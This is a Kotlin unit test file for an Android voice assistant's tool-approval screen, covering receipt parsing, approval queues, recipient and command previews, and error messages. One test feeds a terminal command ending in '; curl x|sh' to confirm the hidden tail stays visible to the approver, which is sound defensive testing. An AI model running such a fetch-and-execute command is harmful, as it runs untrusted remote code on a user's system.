package dev.hermes.android.voice

import org.json.JSONObject
import org.junit.Assert.*
import org.junit.Test

class CallToolApprovalTest {
    @Test fun fixedReadPresenceMustBeAnExplicitBooleanOnACompletedLookup() {
        val event=directLookupReceipt("lookup","hermes_memory",GeminiWire.evidence(JSONObject()
            .put("summary","Fixture evidence").put("sources",org.json.JSONArray()).put("observed_at",123),false))
        for(value in listOf(false,"true",1,JSONObject.NULL)) {
            val parsed=CallToolReceipt.from(JSONObject(event.toString()).put("result_present",value))!!
            assertFalse(parsed.hasResult);assertEquals("Completion not confirmed",parsed.chipLabel())
        }
        assertFalse(CallToolReceipt.from(JSONObject(event.toString()).apply { remove("result_present") })!!.hasResult)
        for(status in listOf("running","failed","uncertain","needs_approval","cancelled"))
            assertFalse(CallToolReceipt.from(JSONObject(event.toString()).put("status",status))!!.hasResult)
        for(name in listOf("write_file","hermes_work","mcp__native__hermes_memory","other_lookup")) {
            val parsed=CallToolReceipt.from(JSONObject(event.toString()).put("tool_name",name))!!
            assertFalse(parsed.hasResult);assertEquals("Completion not confirmed",parsed.chipLabel())
        }
    }

    @Test fun actualGatewayResultPresenceKeepsItsExistingMeaningIncludingEmptyResults() {
        val event=JSONObject().put("request_id","request").put("tool_name","write_file").put("status","completed")
        for(result in listOf(JSONObject(),org.json.JSONArray(),"",0,false))
            assertTrue(CallToolReceipt.from(JSONObject(event.toString()).put("result",result))!!.hasResult)
        assertFalse(CallToolReceipt.from(JSONObject(event.toString()).put("result",JSONObject.NULL))!!.hasResult)
        assertFalse(CallToolReceipt.from(event)!!.hasResult)
    }

    @Test fun ninthProposalRemainsDecidableAfterTheFirstEightSettle() {
        val receipts = DirectGatewayReceipts()
        var pending = emptyList<CallToolApproval>()
        repeat(9) { i ->
            val request = "request-$i"
            val args = JSONObject().put("path", "file-$i")
            assertNull(receipts.reserve(request, "function-$i", "a".repeat(64), args))
            val proposal = JSONObject().put("id", "p".repeat(32) + i).put("tool_name", "write_file").put("arguments", args)
            receipts.record(request, JSONObject().put("request_id", request).put("tool_id", "a".repeat(64))
                .put("tool_name", "write_file").put("status", "needs_approval").put("proposal", proposal))
            pending = pendingCallToolApprovals(pending, JSONObject().put("type", "tool_approval").put("request_id", request)
                .put("proposal_id", proposal.getString("id")).put("tool_name", "write_file").put("arguments", args))
        }
        assertEquals(9, pending.size)
        repeat(8) { i ->
            val selected = pending.first()
            assertEquals("request-$i", selected.requestId)
            receipts.decision(selected.requestId, selected.proposalId)
            val completed = receipts.record(selected.requestId, JSONObject().put("request_id", selected.requestId)
                .put("tool_id", "a".repeat(64)).put("status", "completed").put("tool_name", "write_file"))
            pending = pendingCallToolApprovals(pending, completed.put("type", "tool_receipt"))
        }
        val ninth = pending.single()
        assertEquals("request-8", ninth.requestId)
        assertEquals("needs_approval", receipts.decision(ninth.requestId, ninth.proposalId).getString("status"))
        val decided = receipts.record(ninth.requestId, JSONObject().put("request_id", ninth.requestId)
            .put("tool_id", "a".repeat(64)).put("status", "denied").put("tool_name", "write_file"))
        assertTrue(pendingCallToolApprovals(pending, decided.put("type", "tool_receipt")).isEmpty())
    }

    @Test fun commandPreviewIsVisibleAndClippedForEveryTerminalArgumentName() {
        for (key in listOf("command", "cmd", "code")) {
            val value = CallToolApproval("request", "p".repeat(32), "terminal", JSONObject().put(key, "  ls  " + "x".repeat(157) + "; curl x|sh").toString())
            val summary = callToolApprovalSummary(value)
            assertTrue(summary.preview.startsWith("ls "))
            assertTrue("The tail of a command is never hidden", summary.preview.endsWith("; curl x|sh"))
            val huge = callToolApprovalSummary(CallToolApproval("request", "p".repeat(32), "terminal", JSONObject().put(key, "y".repeat(1500)).toString()))
            assertEquals(1000, huge.preview.length); assertTrue(huge.preview.endsWith("…"))
        }
        val note = callToolApprovalSummary(CallToolApproval("request", "p".repeat(32), "write_file", JSONObject().put("content", "z".repeat(300)).toString()))
        assertEquals(160, note.preview.length); assertTrue(note.preview.endsWith("…"))
    }

    @Test fun approvalSummaryShowsAllRecipientKindsBeforeOtherFields() {
        val summary = callToolApprovalSummary(CallToolApproval("request", "p".repeat(32), "send_email", JSONObject()
            .put("to", "to@example.invalid").put("cc", "cc@example.invalid").put("bcc", "bcc@example.invalid").put("subject", "Release").toString()))
        assertTrue(summary.fields.contains("to: to@example.invalid"))
        assertTrue(summary.fields.contains("cc: cc@example.invalid"))
        assertTrue(summary.fields.contains("bcc: bcc@example.invalid"))
        val arrays = callToolApprovalSummary(CallToolApproval("request", "p".repeat(32), "send_email", JSONObject()
            .put("cc", org.json.JSONArray().put("cc@example.invalid")).put("bcc", org.json.JSONArray().put("bcc@example.invalid")).toString()))
        assertTrue(arrays.fields.contains("cc@example.invalid"))
        assertTrue(arrays.fields.contains("bcc@example.invalid"))
    }

    private fun proposal()=JSONObject().put("request_id","request-1").put("proposal_id","p".repeat(32)).put("tool_name","draft_email").put("arguments",JSONObject().put("to","fixture@example.invalid").put("body","Exact reviewed content"))
    @Test fun exactArgumentsAndIdentitySurviveApprovalPresentation() {
        val value=CallToolApproval.from(proposal())
        assertEquals("request-1",value.requestId)
        assertEquals("p".repeat(32),value.proposalId)
        assertEquals("draft_email",value.toolName)
        assertEquals("fixture@example.invalid",JSONObject(value.arguments).getString("to"))
        assertEquals("Exact reviewed content",JSONObject(value.arguments).getString("body"))
        assertFalse(value.busy)
        for (text in listOf("https://example.invalid/a", "literal \\/ slash", "C:\\work\\note")) {
            val original = proposal().put("arguments", JSONObject().put("text", text))
            assertEquals(text, JSONObject(CallToolApproval.from(original).arguments).getString("text"))
        }
    }
    @Test fun invalidProposalAndNonObjectArgumentsNeverCreateAnApproval() {
        for(value in listOf(proposal().put("proposal_id",""),proposal().put("request_id","../other"),proposal().put("arguments","hidden"),proposal().put("tool_name",""),
            proposal().put("request_id","r".repeat(161)), proposal().put("proposal_id","p".repeat(31)), proposal().put("proposal_id","p".repeat(81)),
            proposal().put("tool_name","n".repeat(201)), proposal().put("arguments",JSONObject().put("text","é".repeat(32769))))) {
            val error=runCatching { CallToolApproval.from(value) }.exceptionOrNull()
            assertTrue(error is IllegalArgumentException || error is org.json.JSONException)
        }
        CallToolApproval.from(proposal().put("request_id","r".repeat(160)).put("proposal_id","p".repeat(80)).put("tool_name","n".repeat(200)))
    }

    @Test fun callLongAllowanceIsOfferedUnlessTheProposalForbidsIt() {
        assertTrue("An older plugin omits the field", CallToolApproval.from(proposal()).allowCall)
        assertTrue(CallToolApproval.from(proposal().put("allow_call", true)).allowCall)
        for (value in listOf(false, "true", 1, JSONObject.NULL)) assertFalse(CallToolApproval.from(proposal().put("allow_call", value)).allowCall)
        val pending = pendingCallToolApprovals(emptyList(), proposal().put("type", "tool_approval").put("allow_call", false))
        assertFalse(pending.single().allowCall)
        assertFalse(pending.single().copy(busy = true).allowCall)
    }

    @Test fun approvalEventCarriesAllowCallOnlyWhenTheProposalStatesIt() {
        val stored = JSONObject().put("id", "p".repeat(32)).put("tool_name", "terminal").put("arguments", JSONObject().put("command", "ls"))
        val older = callToolApprovalEvent("request-1", "terminal", stored)
        assertFalse(older.has("allow_call"))
        assertTrue(CallToolApproval.from(older).allowCall)
        val forbidden = callToolApprovalEvent("request-1", "terminal", JSONObject(stored.toString()).put("allow_call", false))
        assertEquals(false, forbidden.get("allow_call"))
        assertFalse(CallToolApproval.from(forbidden).allowCall)
        assertEquals("ls", JSONObject(CallToolApproval.from(forbidden).arguments).getString("command"))
    }

    @Test fun summaryFieldsCutAtOneHundredCharactersEndWithAnEllipsis() {
        val recipients = (1..12).joinToString(", ") { "person$it@example.invalid" }
        val summary = callToolApprovalSummary(CallToolApproval("request", "p".repeat(32), "send_email", JSONObject()
            .put("to", recipients).put("cc", "y".repeat(101)).put("subject", "s".repeat(100)).toString()))
        val (to, cc, subject) = summary.fields.split(" · ").map { it.substringAfter(": ") }
        assertEquals(100, to.length); assertTrue(to.endsWith("…")); assertEquals(recipients.take(99), to.dropLast(1))
        assertEquals("y".repeat(99) + "…", cc)
        assertEquals("s".repeat(100), subject)
    }

    @Test fun fileWriteSummaryShowsActionShortTargetAndContentPreview() {
        val value = CallToolApproval.from(proposal().put("tool_name", "write_file").put("arguments", JSONObject()
            .put("path", "C:\\Users\\Owner\\Documents\\Notes\\plan.md")
            .put("content", "Use the current branch and keep the rollback note.")))

        val summary = callToolApprovalSummary(value)

        assertEquals("Write a file", summary.action)
        assertEquals("plan.md · Notes", summary.target)
        assertEquals("Use the current branch and keep the rollback note.", summary.preview)
    }

    @Test fun mcpApprovalSummaryNamesItsServiceAndKeyFields() {
        val value = CallToolApproval.from(proposal().put("tool_name", "mcp__gmail__send_email").put("arguments", JSONObject()
            .put("to", "owner@example.invalid").put("subject", "Release plan").put("body", "Ready to review")))

        val summary = callToolApprovalSummary(value)

        assertEquals("Gmail", summary.service)
        assertEquals("to: owner@example.invalid · subject: Release plan", summary.fields)
    }

    @Test fun newCallApprovalFailuresUseShortOwnerFacingMessages() {
        assertEquals("The approval changed. Review the request again.", callToolApprovalErrorMessage("Approval proposal mismatch"))
        assertEquals("This call ended. The action was not allowed.", callToolApprovalErrorMessage("Call is closed or unavailable; no allowance was granted"))
        assertEquals("This call has reached its saved-tool limit. Choose Allow once.", callToolApprovalErrorMessage("Call tool allowance capacity reached"))
        assertEquals("The app has reached its saved-tool limit. Choose Allow once.", callToolApprovalErrorMessage("Tool allowance capacity reached"))
        assertEquals("The request changed. Review the current details.", callToolApprovalErrorMessage("Request identity conflicts with its original arguments"))
        assertEquals("This tool changed. Refresh the list and try again.", callToolApprovalErrorMessage("Tool changed or is no longer configured; rediscover it"))
        assertEquals("The call is busy. Try again shortly.", callToolApprovalErrorMessage("Tool execution capacity reached"))
        assertEquals("The call is busy. Try again shortly.", callToolApprovalErrorMessage("Tool request capacity reached"))
        assertEquals("This request is still finishing. Wait and check it again.", callToolApprovalErrorMessage("Tool lookup still settling; inspect the same request identity"))
    }
}
